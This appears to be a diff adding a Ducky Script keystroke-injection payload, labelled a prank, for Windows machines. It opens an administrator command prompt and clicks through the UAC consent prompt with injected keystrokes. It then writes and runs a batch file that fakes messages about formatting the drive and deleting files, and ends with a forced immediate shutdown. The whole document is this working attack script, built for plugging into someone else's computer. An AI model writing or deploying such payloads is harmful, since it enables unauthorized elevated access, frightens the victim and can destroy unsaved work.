@@ -1,0 +1,96 @@
+REM Title: Erase Disk Prank
+REM Author: F1ch3u5
+REM Description: .bat file that simulates through messages that it is deleting system files and when it finishes it closes the session with a false error message
+REM Target: Windows
+
+REM ######## INITIALIZATION ########
+
+DELAY 2000
+
+REM ######## STAGE1 ########
+
+GUI r
+DELAY 3000
+STRING cmd
+DELAY 3000
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 2000
+ENTER
+DELAY 2500
+ENTER
+DELAY 500
+STRING @echo off > format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo title Format hard drive >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo echo Do you want to format the hard drive? (y/n) >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo pause >nul >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo echo Analyzing... >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo. >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo pause >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo cls >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo dir /s >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo dir /s >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo dir /s >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo. >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo. >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo pause >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo cls >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo echo Deleting files... >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo. >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo pause  >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo cls >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo echo Files Deleted  >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo. >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING echo shutdown /s /f /t 0 >> format_hard_drive.bat
+DELAY 1000
+ENTER
+STRING format_hard_drive.bat
+DELAY 1000
+ENTER
+
+
+
+
